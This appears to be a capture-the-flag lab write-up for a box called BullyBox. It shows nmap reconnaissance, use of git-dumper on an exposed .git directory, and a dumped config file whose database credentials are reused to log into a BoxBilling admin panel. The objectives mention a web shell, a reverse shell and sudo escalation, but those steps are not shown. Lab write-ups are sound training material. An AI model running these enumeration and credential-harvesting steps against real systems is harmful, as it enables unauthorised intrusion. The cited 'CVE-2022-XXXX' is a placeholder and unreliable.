Summary

This lab demonstrates exploiting a git directory exposure to retrieve sensitive configuration files, including database credentials. Using these credentials, learners log into the BoxBilling admin panel and exploit an authenticated RCE vulnerability (CVE-2022-XXXX). Privilege escalation is achieved as the compromised user yuki is part of the sudo group, enabling direct root access. This lab highlights misconfigured git repositories, web exploitation, and privilege escalation via sudo permissions.

Learning Objectives

After completion of this lab, learners will be able to:

Enumerate services and discover the exposed git directory on the web server.
Use git-dumper to download the repository and retrieve sensitive files like bb-config.php.
Extract database credentials and log into the BoxBilling admin panel.
Exploit the RCE vulnerability by uploading a PHP web shell and executing commands.
Gain a reverse shell as the yuki user, and escalate to root using sudo su.



```sh
sudo sh -c "echo '192.168.58.27 BULLYBOX' >> /etc/hosts"
sudo sh -c "echo '192.168.58.27 BULLYBOX.local' >> /etc/hosts"

```

```

???(kali?kali)-[~]
??$ nmap -sV -sC -T4 -oA initial 192.168.58.27
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-10 17:54 +0000
Nmap scan report for 192.168.58.27
Host is up (0.00068s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b9:bc:8f:01:3f:85:5d:f9:5c:d9:fb:b6:15:a0:1e:74 (ECDSA)
|_  256 53:d9:7f:3d:22:8a:fd:57:98:fe:6b:1a:4c:ac:79:67 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel




```

http://bullybox.local/.git/HEAD

```

pipx install git-dumper

git-dumper http://bullybox.local/.git git-loot

cd git-loot/

```

```php
  array (
    'type' => 'mysql',
    'host' => 'localhost',
    'name' => 'boxbilling',
    'user' => 'admin',
    'password' => 'Playing-Unstylish7-Provided',
    # admin@bullybox.local
  ),

```

http://bullybox.local/bb-admin

```
admin@bullybox.local
Playing-Unstylish7-Provided
```
